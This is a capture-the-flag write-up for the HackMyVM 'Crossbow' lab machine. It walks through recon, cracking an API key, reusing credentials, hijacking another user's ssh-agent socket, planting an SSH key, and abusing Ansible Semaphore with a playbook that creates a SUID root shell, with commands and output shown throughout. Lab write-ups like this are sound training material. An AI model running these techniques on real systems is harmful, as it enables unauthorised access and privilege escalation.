# Crossbow

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.123:22
Open 10.0.2.123:80
Open 10.0.2.123:9090
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.123
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp   open  http    syn-ack Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Polo's Adventures
9090/tcp open  http    syn-ack Cockpit web service 282 or later
|_http-favicon: Unknown favicon MD5: EF66F9C42198FEE38AF53F848B36A4F7
|_http-title: Loading...
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

![writeup.png](/assets/pentest/hackmyvm/crossbow/writeup.png)

```js
└─$ curl 'http://10.0.2.123/app.js'
document.addEventListener("DOMContentLoaded", function() {
    fetch(API_ENDPOINT, {
        headers: {
            "Authorization": `Bearer ${API_KEY}`
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data && Array.isArray(data.messages)) {
            const randomMessage = data.messages[Math.floor(Math.random() * data.messages.length)];

            const messageElement = document.createElement("blockquote");
            messageElement.textContent = randomMessage;
            messageElement.style.marginTop = "20px";
            messageElement.style.fontStyle = "italic";

            const container = document.querySelector(".container");
            container.appendChild(messageElement);
        }
    });
});

└─$ curl 'http://10.0.2.123/config.js'
const API_ENDPOINT = "https://phishing.crossbow.hmv/data";
const HASH_API_KEY = "49ef6b765d39f06ad6a20bc951308393";

// Metadata for last system upgrade
const SYSTEM_UPGRADE = {
    version: "2.3.1",
    date: "2023-04-15",
    processedBy: "SnefruTools V1",
    description: "Routine maintenance and security patches"
}
```

Update DNS

![writeup-1.png](/assets/pentest/hackmyvm/crossbow/writeup-1.png)

I tried unhashing the API Key, but unsuccessful
- [https://crackstation.net](https://crackstation.net): Nothing
- [https://www.cmd5.org](https://www.cmd5.org): Nothing
- [https://md5hashing.net](https://md5hashing.net): Crashed after few minutes

```bash
└─$ hashid 49ef6b765d39f06ad6a20bc951308393
Analyzing '49ef6b765d39f06ad6a20bc951308393'
[+] MD2 # Nope
[+] MD5 # Nope
[+] MD4 # Nope
[+] Double MD5 # Maybe
[+] LM # Nope
[+] RIPEMD-128 # Maybe
[+] Haval-128 # Maybe
[+] Tiger-128 # Maybe
[+] Skein-256(128) # Maybe
[+] Skein-512(128) # Maybe
[+] Lotus Notes/Domino 5 # Probably not
[+] Skype # Probably not
[+] Snefru-128  # Maybe
[+] NTLM # Nope
[+] Domain Cached Credentials # Nope
[+] Domain Cached Credentials 2 # Nope
[+] DNSSEC(NSEC3) # Nope
[+] RAdmin v2.x # Nope
```

Checking hashes one by one in [https://md5hashing.net/hash/snefru/49ef6b765d39f06ad6a20bc951308393](https://md5hashing.net/hash/snefru/49ef6b765d39f06ad6a20bc951308393) yielded success

![writeup-2.png](/assets/pentest/hackmyvm/crossbow/writeup-2.png)

::: info Creds
`API_KEY:ELzkRudzaNXRyNuN6`
:::

## HTTP (9090)

Since the website was about person Polo that's probably a potential username.

::: info Creds
`polo:ELzkRudzaNXRyNuN6`
:::

![writeup-3.png](/assets/pentest/hackmyvm/crossbow/writeup-3.png)

### RCE

![writeup-4.png](/assets/pentest/hackmyvm/crossbow/writeup-4.png)

No SSH access yet.

## SSH

There's something in `/tmp` directory related to 
```bash
polo@crossbow:/tmp$ find /tmp -ls
    55971      4 drwxrwxrwt   4 root     root         4096 Dec  2 13:17 /tmp
    43888      0 srwxrwxrwx   1 polo     polo            0 Dec  2 13:08 /tmp/dbus-9hy9OC7JTe
    43831      4 drwx------   2 lea      lea          4096 Dec  2 12:45 /tmp/ssh-XXXXXXUW5aBs
find: ‘/tmp/ssh-XXXXXXUW5aBs’: Permission denied
    43885      4 drwx------   2 polo     polo         4096 Dec  2 13:08 /tmp/ssh-XXXXXXfMopMO
    43887      0 srw-------   1 polo     polo            0 Dec  2 13:08 /tmp/ssh-XXXXXXfMopMO/agent.88149
```

- [strange folder in /tmp with name ssh-\*](https://askubuntu.com/questions/979911/strange-folder-in-tmp-with-name-ssh)

```bash
└─$ man ssh-agent
       -T      Bind the agent socket in a randomised subdirectory of the form $TMPDIR/ssh-XXXXXXXXXX/agent.<ppid>, instead of the default behaviour of using a randomised name matching $HOME/.ssh/agent/s.*.

└─$ man ssh
       SSH_AUTH_SOCK         Identifies the path of a Unix-domain socket used to communicate with the agent.
```

Available users:
```bash
polo@crossbow:/tmp$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
lea:x:1000:1000::/home/lea:/bin/bash
polo:x:1001:1001:,,,:/home/polo:/bin/bash
pedro:x:1002:1002::/home/pedro:/bin/sh
```

Either **lea** or **pedro** is running SSH agent
```bash
polo@crossbow:~$ ps -eo user,pid,ppid,cmd | grep -e lea -e pedro
lea           13       1 /bin/bash /home/lea/.local/agent
lea         1083       1 ssh-agent
polo      114749  107115 grep -e lea -e pedro
```

- [SSH Agent Forwarding Exploitation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/ssh-forward-agent-exploitation.html#ssh-agent-forwarding-exploitation) (Original)
- [SSH Forward Agent exploitation](https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/ssh-forward-agent-exploitation) (Pwetty)
- [SSH Agent Hijacking](https://www.clockwork.com/insights/ssh-agent-hijacking/)

Going from PID and downwards with agent ID we successfully authenticated on SSH as Pedro
```bash
polo@crossbow:~$ SSH_AUTH_SOCK=/tmp/ssh-XXXXXXUW5aBs/agent.1082 ssh pedro@10.0.2.123
```

SSH was only accessible when using real IPv4, probably because we are in a container.
```bash
polo@crossbow:~$ SSH_AUTH_SOCK=/tmp/ssh-XXXXXXUW5aBs/agent.1082 ssh pedro@0
pedro@0.0.0.0: Permission denied (publickey).

polo@crossbow:~$ SSH_AUTH_SOCK=/tmp/ssh-XXXXXXUW5aBs/agent.1082 ssh pedro@localhost
pedro@localhost: Permission denied (publickey).

polo@crossbow:~$ SSH_AUTH_SOCK=/tmp/ssh-XXXXXXUW5aBs/agent.1082 ssh pedro@10.0.2.123
Last login: Tue Dec  2 15:24:05 2025 from 172.17.0.2
╭─pedro@crossbow ~
╰─$ id
uid=1002(pedro) gid=1002(pedro) groups=1002(pedro),100(users)
```

### User.txt

```bash
╰─$ cat user.txt
58cb1e1bdb3a348ddda53f22ee7c1613
```

## Privilege Escalation

There's another application running internally
```bash
╰─$ curl 0:3000 -s | grep title
    <title>Ansible Semaphore</title>
```

Make SSH access easier
```bash
└─$ ssh-keygen -f id_rsa -P x -q
└─$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEdV7y1iattyNDHj2XJ8m7owwSKpANYSNqO6WfSifAK7 woyag@kraken' >> ~/.ssh/authorized_keys
---
╰─$ mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEdV7y1iattyNDHj2XJ8m7owwSKpANYSNqO6WfSifAK7 woyag@kraken' >> ~/.ssh/authorized_keys
```

### Ansible Semaphore

Port forward
```bash
└─$ ssh -i id_rsa pedro@10.0.2.123 -L 3000:0:3000
```

Try `admin:admin`

![writeup-5.png](/assets/pentest/hackmyvm/crossbow/writeup-5.png)

Create new repository since we can't access `/root`

![writeup-6.png](/assets/pentest/hackmyvm/crossbow/writeup-6.png)

Create malicious yaml task
- [https://dev.to/nolunchbreaks_22/how-hackers-exploit-ansible-for-configuration-attacks-a-technical-deep-dive-30lp](https://dev.to/nolunchbreaks_22/how-hackers-exploit-ansible-for-configuration-attacks-a-technical-deep-dive-30lp)
- [https://gtfobins.github.io/gtfobins/ansible-playbook/](https://gtfobins.github.io/gtfobins/ansible-playbook/)

```bash
╰─$ echo '[{hosts: localhost, tasks: [shell: install -m4777 /bin/bash /tmp/rootbash ]}]' > /tmp/letmein.yml
```

Add the new task

![writeup-7.png](/assets/pentest/hackmyvm/crossbow/writeup-7.png)

Hmm... we get an error when running job

![writeup-8.png](/assets/pentest/hackmyvm/crossbow/writeup-8.png)

This error means that **current locale environment variables are set to something your system does NOT support**, so Python/Ansible choke on it. Happens when `LANG`, `LC_ALL`, etc. point to a locale that isn't generated or doesn't exist.

Create new Environment variables
```json
{
  "LANG": "C.UTF-8",
  "LC_ALL": "C.UTF-8" 
}
```

Let the task finish and toor
```bash
╰─$ ls -alh /tmp/rootbash
-rwsrwxrwx 1 root root 1.3M Dec  2 18:27 /tmp/rootbash
╰─$ /tmp/rootbash -p
rootbash-5.2# id
uid=1002(pedro) gid=1002(pedro) euid=0(root) groups=1002(pedro),100(users)
```

### Root.txt

```
rootbash-5.2# cat /root/root.txt
7a299c41b1daac46d5ab98745b212e09
```